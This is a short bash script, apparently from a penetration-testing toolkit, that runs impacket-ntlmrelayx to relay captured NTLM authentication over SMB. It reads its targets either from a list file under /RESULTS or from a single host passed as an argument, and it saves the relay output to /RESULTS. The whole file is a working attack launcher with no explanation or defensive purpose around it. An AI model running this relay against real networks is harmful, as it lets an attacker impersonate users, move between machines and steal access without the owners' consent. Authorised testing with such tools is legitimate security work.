#!/bin/bash
if [ -f "/RESULTS/$1" ]; then
   impacket-ntlmrelayx -l /RESULTS -tf "/RESULTS/$1" -smb2support
else
    impacket-ntlmrelayx -l /RESULTS -t "$1" -smb2support
fi